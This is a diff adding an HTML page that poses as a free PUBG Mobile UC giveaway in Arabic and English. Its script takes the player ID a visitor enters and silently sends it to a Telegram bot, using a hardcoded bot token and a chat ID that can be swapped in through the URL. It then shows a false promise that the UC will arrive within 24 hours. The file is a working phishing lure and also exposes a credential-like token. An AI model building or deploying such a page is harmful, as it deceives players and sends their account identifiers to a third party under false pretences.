@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<script>
+function collect() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const id = document.getElementById('pid').value;
+    const msg = `🎮 **صيد ببجي (ID)**\n\n🆔 الأيدي: \`${id}\``;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    alert("تهانينا! سوف يتم فحص الحساب وإرسال الشدات خلال 24 ساعة.");
+}
+</script>
+<body style="background:black; color:yellow; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h1 style="font-size:30px;">PUBG MOBILE UC FREE</h1>
+    <p style="color:white;">أدخل الأيدي الخاص بك للحصول على 600 شدة مجاناً</p>
+    <input id="pid" placeholder="Enter Player ID" style="width:70%; padding:10px; margin:20px; text-align:center;"><br>
+    <button onclick="collect()" style="background:yellow; color:black; padding:15px 40px; border:none; font-weight:bold; border-radius:5px;">الحصول الآن</button>
+</body>
+</html>
